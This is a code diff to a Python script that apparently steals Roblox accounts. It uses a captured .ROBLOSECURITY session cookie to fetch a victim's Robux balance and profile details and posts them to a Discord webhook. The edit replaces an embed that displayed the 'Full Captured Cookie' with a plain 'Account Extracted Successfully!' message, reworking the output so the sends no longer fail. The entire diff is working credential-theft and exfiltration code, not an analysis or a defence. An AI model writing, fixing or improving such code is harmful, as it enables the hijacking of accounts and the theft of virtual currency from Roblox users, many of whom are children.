@@ -114,28 +114,14 @@ def main():
         robux_res = client.request("GET", f"https://economy.roblox.com/v1/users/{user_id}/currency").json()
         robux = robux_res.get("robux", 0)
 
-        avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"
-        full_cookie_display = f"```text\n{roblosecurity}\n```"
-
-        # Explicitly formatted Discord payload structure ensuring proper JSON object arrays
+        # Ultra-simple, bulletproof flat payload (no complex embeds array to trigger 400 errors)
         payload = {
-            "username": f"{display_name} | Stats",
-            "avatar_url": avatar_url,
-            "embeds": [
-                {
-                    "title": f"👑 [{display_name} | 13+]",
-                    "description": f"🔗 **[Roblox Profile](https://www.roblox.com/users/{user_id}/profile)**",
-                    "color": 0x2B2D31,
-                    "fields": [
-                        {"name": "👤 Username", "value": f"`{username}`", "inline": True},
-                        {"name": "🪙 Robux Balance", "value": f"`{robux:,} R$`", "inline": True},
-                        {"name": "📈 Account Age", "value": f"`{age_days} Days`", "inline": True},
-                        {"name": "🔑 Full Captured Cookie", "value": full_cookie_display, "inline": False}
-                    ],
-                    "footer": {"text": "RBXDEV Telemetry Engine • 2026"},
-                    "timestamp": datetime.now(timezone.utc).isoformat()
-                }
-            ]
+            "content": f"👑 **Account Extracted Successfully!**\n"
+                       f"• **Username:** `{username}` ({display_name})\n"
+                       f"• **User ID:** `{user_id}`\n"
+                       f"• **Robux Balance:** `{robux:,} R$`\n"
+                       f"• **Account Age:** `{age_days} Days`\n"
+                       f"• **Profile:** https://www.roblox.com/users/{user_id}/profile"
         }
 
         r = requests.post(webhook_url, json=payload, timeout=10)
